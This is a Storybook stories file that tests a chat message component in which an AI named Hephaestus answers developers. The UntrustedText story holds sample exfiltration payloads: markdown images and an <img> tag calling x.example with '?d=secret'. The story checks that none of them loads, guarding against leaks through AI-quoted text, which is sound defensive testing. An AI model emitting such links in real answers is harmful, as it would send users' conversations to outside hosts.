import type { Meta, StoryObj } from "@storybook/react-vite";
import { useState } from "react";
import { expect, userEvent } from "storybook/test";

import { Button } from "@/components/ui/button";
import { minutesBefore } from "@/stories/story-clock";

import { ConversationMessage, type ConversationMessageProps } from "./ConversationMessage";
import {
	ANSWER,
	ANSWER_WITH_FEEDBACK,
	DEVELOPER,
	DIGEST,
	QUESTION,
	SLACK_ANSWER,
	SLACK_QUESTION,
	WEEKLY_DIGEST,
	WORKSPACE_SLUG,
} from "./fixtures";
import { WeeklyDigestCard } from "./WeeklyDigestCard";

const meta = {
	component: ConversationMessage,
	parameters: { layout: "padded" },
	tags: ["autodocs"],
	args: { message: QUESTION, developer: DEVELOPER },
	decorators: [
		(Story) => (
			<div className="max-w-3xl">
				<Story />
			</div>
		),
	],
} satisfies Meta<typeof ConversationMessage>;

export default meta;
type Story = StoryObj<typeof meta>;

/** The developer's message, signed with their name. */
export const Default: Story = {
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Ada Lovelace")).toBeVisible();
		await expect(canvas.queryByText("Slack")).toBeNull();
	},
};

/** Hephaestus's headings stand out from its text, one level below the heading the message sits under. */
export const Answer: Story = {
	args: { message: { ...ANSWER, text: SLACK_ANSWER.text } },
	play: async ({ canvas, canvasElement }) => {
		await expect(canvas.getByText("Hephaestus", { exact: true })).toBeVisible();
		await expect(canvas.getByText("AI", { exact: true })).toBeVisible();
		// A stored answer never fades in, on its first paint or a remount.
		await expect(canvasElement.querySelector("[data-sd-animate]")).toBeNull();
		const heading = canvas.getByRole("heading", { level: 3, name: "Why" });
		await expect(Number(getComputedStyle(heading).fontWeight)).toBeGreaterThanOrEqual(600);
	},
};

/** Written in Slack: the header says where, so the reader knows the conversation moved. */
export const Slack: Story = {
	args: { message: SLACK_QUESTION },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Slack")).toBeVisible();
	},
};

/** Edited in Slack after it was sent. */
export const Edited: Story = {
	args: { message: { ...SLACK_QUESTION, editedAt: minutesBefore(35) } },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("(edited)")).toBeVisible();
	},
};

/**
 * Hephaestus's words, then each result, problem or feedback it showed, in Hephaestus's words and in the order
 * Hephaestus linked it, with a link to the developer's feedback on the work it is about.
 */
export const FeedbackLinks: Story = {
	args: { message: ANSWER_WITH_FEEDBACK, workspaceSlug: WORKSPACE_SLUG },
	play: async ({ canvas }) => {
		await expect(
			canvas.getByText(/but not why it beat invalidating on write/u, { selector: "p" }),
		).toBeVisible();
		await expect(
			canvas.getByText(/add one line on why the cache beats/u, { selector: "p" }),
		).toBeVisible();
		await expect(canvas.getByText(/explained its decision well/u, { selector: "p" })).toBeVisible();
		// The problem and the feedback name their work; the result's work the developer can no longer see.
		const links = canvas.getAllByRole("link", { name: "Your feedback on this work" });
		await expect(links.map((link) => link.getAttribute("href"))).toStrictEqual([
			"/w/aet/feedback/421",
			"/w/aet/feedback/433",
		]);
	},
};

/** Without the workspace, Hephaestus's words stay, and nothing links. */
export const FeedbackLinksUnlinked: Story = {
	args: { message: ANSWER_WITH_FEEDBACK },
	play: async ({ canvas }) => {
		await expect(
			canvas.getByText(/but not why it beat invalidating on write/u, { selector: "p" }),
		).toBeVisible();
		await expect(canvas.queryByRole("link")).toBeNull();
	},
};

/** A follow-up from the same author moments later drops the avatar and the header, but still names them to a screen reader. */
export const Grouped: Story = {
	args: { grouped: true },
	play: async ({ canvas }) => {
		await expect(canvas.queryByText("AL")).toBeNull();
		await expect(canvas.getByText(/^Ada Lovelace, /u)).toHaveClass("sr-only");
	},
};

/** Every answer keeps its author and AI disclosure, including a follow-up beside another answer. */
export const GroupedAnswer: Story = {
	args: { message: ANSWER, grouped: true },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Hephaestus", { exact: true })).toBeVisible();
		await expect(canvas.getByText("AI", { exact: true })).toBeVisible();
	},
};

/** The developer deleted it. The row stays, so the answers around it still read in order. */
export const Deleted: Story = {
	args: { message: { ...QUESTION, deleted: true, text: "" } },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("This message was deleted.")).toBeVisible();
	},
};

/** A weekly digest summarizes recorded work without a model. */
export const Digest: Story = {
	args: {
		message: DIGEST,
		children: <WeeklyDigestCard digest={WEEKLY_DIGEST} workspaceSlug={WORKSPACE_SLUG} />,
	},
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Weekly digest")).toBeVisible();
		await expect(canvas.queryByText("AI", { exact: true })).toBeNull();
		await expect(canvas.getByText("5–11 October 2026")).toBeVisible();
		await expect(canvas.queryByText(/weekly_digest\.json/u)).toBeNull();
	},
};

/**
 * Hephaestus's words can quote text a teammate wrote. Neither they nor a shown result can make the browser
 * load an image, so nothing the page renders sends the conversation to another address.
 */
export const UntrustedText: Story = {
	args: {
		message: {
			...ANSWER_WITH_FEEDBACK,
			text: [
				"Here is the summary. ![summary](https://x.example/p?d=secret)",
				"",
				'<img src="https://x.example/q?d=secret" alt="raw">',
			].join("\n"),
			links: ANSWER_WITH_FEEDBACK.links.map((link) => ({
				...link,
				text: `${link.text} ![chart](https://x.example/r?d=secret)`,
			})),
		},
		workspaceSlug: WORKSPACE_SLUG,
	},
	play: async ({ canvas, canvasElement }) => {
		await expect(canvas.getByText(/Here is the summary/u)).toBeVisible();
		await expect(canvas.getByText(/a five-minute cache/u)).toBeVisible();
		await expect(canvasElement.querySelectorAll("img")).toHaveLength(0);
	},
};

/** Still arriving: a construct Hephaestus has not closed yet already renders as written. */
export const Streaming: Story = {
	args: {
		message: { ...ANSWER, text: "Your team asks for pull request descriptions that **explain" },
		streaming: true,
	},
	play: async ({ canvas }) => {
		const explain = canvas.getByText("explain");
		await expect(Number(getComputedStyle(explain).fontWeight)).toBeGreaterThanOrEqual(600);
		await expect(canvas.queryByText(/\*\*/u)).toBeNull();
	},
};

const STREAMED_CHUNKS = [
	"Your team asks for pull request",
	" descriptions that explain why.",
	"\n\nTwo of yours this week left the reason out.",
];

/** The answer as the stream delivers it, one more chunk at each press of Next. */
function StreamingAnswer(props: ConversationMessageProps) {
	const [chunks, setChunks] = useState(1);
	return (
		<div className="flex flex-col gap-3">
			<Button
				variant="outline"
				className="self-start"
				onClick={() => setChunks((count) => count + 1)}
			>
				Next
			</Button>
			<ConversationMessage
				{...props}
				message={{ ...ANSWER, text: STREAMED_CHUNKS.slice(0, chunks).join("") }}
				streaming
			/>
		</div>
	);
}

/**
 * A streaming answer fades in each paragraph once, as it is appended, with no span per word. Words
 * that grow the same paragraph keep its element, so they do not fade it again. The story tests run
 * with reduced motion, as for a reader who asked for it, so they see no fade at all.
 */
export const StreamingFadesEachNewBlock: Story = {
	render: (args) => <StreamingAnswer {...args} />,
	play: async ({ canvas, canvasElement }) => {
		const first = canvas.getByText("Your team asks for pull request");
		await expect(matchMedia("(prefers-reduced-motion: reduce)").matches).toBe(true);
		await expect(getComputedStyle(first).animationName).toBe("none");

		await userEvent.click(canvas.getByRole("button", { name: "Next" }));
		await expect(
			canvas.getByText("Your team asks for pull request descriptions that explain why."),
		).toBe(first);

		await userEvent.click(canvas.getByRole("button", { name: "Next" }));
		const second = canvas.getByText("Two of yours this week left the reason out.");
		await expect(second).not.toBe(first);
		await expect(getComputedStyle(second).animationName).toBe("none");
		await expect(canvasElement.querySelector("[data-sd-animate]")).toBeNull();
	},
};
